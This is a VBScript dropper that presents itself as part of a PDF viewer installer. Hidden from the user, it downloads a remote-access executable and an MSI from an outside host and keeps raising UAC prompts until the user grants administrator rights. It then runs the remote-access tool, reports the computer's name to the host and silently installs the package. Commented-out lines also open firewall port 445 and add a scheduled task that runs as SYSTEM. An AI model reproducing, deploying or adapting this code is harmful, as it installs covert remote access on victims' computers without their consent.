On Error Resume Next
'MsiInfo.exe C:\Users\Francesco\Documents\GitHub\CppWindowsService\Setup1user\Setup1\Release\PdfViewer.msi -w 10
Set oShell = CreateObject ("WScript.Shell") 
Set fso = CreateObject("Scripting.FileSystemObject")
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

With oShell
  .Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
  .Run "curl http://troglo.homepc.it/Supremo.exe -o "& temp &"\Supremo.exe", 0, True
  .Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& temp &"\PdfViewer-admin.msi", 0, True 
  '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& temp &"\sys.bat", 0, True
End With
Do while not fso.FileExists( windir & "\sysexecuser")
  'MsgBox("elevate")  
  'oShell.Run "taskkill /f /im msiexec.exe", 0, True 
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Sleep(2000)
loop

With oShell
  '.Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
  '.Run "curl http://troglo.homepc.it/Supremo.exe -o "& windir &"\Supremo.exe", 0, True
  WScript.Sleep(2000)   
  .Run temp & "\Supremo.exe", 0, True 
  '.Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& windir &"\PdfViewer-admin.msi", 0, True  
  WScript.Sleep(2000) 
  .Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
  '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& windir &"\sys.bat", 0, True
  .Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True  
  '.Run temp & "\sys.bat", 0, True 
  
  WScript.Sleep(2000) 
  .Run "cmd /c del " &windir & "\sysexecuser", 0, True
  
  

'  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
'  .Run "schtasks /stop /tn syssw", 0, True
'  .Run "schtasks /delete /tn syssw /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
'  .Run "schtasks /create /tn syssw /xml " & windir & "\syssw.xml /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\hp\svc.vbs"" /tn syssw /rl highest /F", 0, True
'  .Run "schtasks /run /tn syssw", 0, True
  
  'If UserPerms("Admin") Then
  ' Message = "Good to go"
  '.Run windir & "\file.pdf"
   '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_" & strComputerName, 0, True
  'Else
  ' Message = "Non-Admin"
  'End If
End With


Set objArgs = Wscript.Arguments
'if Wscript.Arguments.count>0 then
if WScript.Arguments.Named.Exists("elevate") then

   'MsgBox("elevate")    
  'if Wscript.Arguments.count>1 then
  '  oShell.Run objArgs(0), 0, True
  'end if
  'oShell.Run "taskkill /f /im cscript.exe", 0, True
  'oShell.Run "taskkill /f /im wscript.exe", 0, True
end if
if Wscript.Arguments.count>1 then
  MsgBox(objArgs(0)) 
  'sname = WScript.ScriptFullName & """ """ & objArgs(0)
else
  sname = WScript.ScriptFullName
end if

'oShell.Run oShell.ExpandEnvironmentStrings( "%APPDATA%" )&"\elevate.exe cscript.exe " & WScript.ScriptFullName, 0, True

WScript.Quit

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    cHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(cHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime 
End Function
Function UserPerms (PermissionQuery)          
 UserPerms = False  ' False unless proven otherwise           
 Dim CheckFor, CmdToRun         

 Select Case Ucase(PermissionQuery)           
 'Setup aliases here           
 Case "ELEVATED"           
   CheckFor =  "S-1-16-12288"           
 Case "ADMIN"           
   CheckFor =  "S-1-5-32-544"           
 Case "ADMINISTRATOR"           
   CheckFor =  "S-1-5-32-544"           
 Case Else                  
   CheckFor = PermissionQuery                  
 End Select           

 CmdToRun = "%comspec% /c whoami /all | findstr /I /C:""" & CheckFor & """"  

 Dim oShell, returnValue        
 Set oShell = CreateObject("WScript.Shell")  
 returnValue = oShell.Run(CmdToRun, 0, true)     
 If returnValue = 0 Then UserPerms = True                   
End Function

Function UACTurnedOn ()
 On Error Resume Next

 Set oShell = CreateObject("WScript.Shell")
 If oShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 0 Then
      UACTurnedOn = false
 Else
      UACTurnedOn = true
 End If
End Function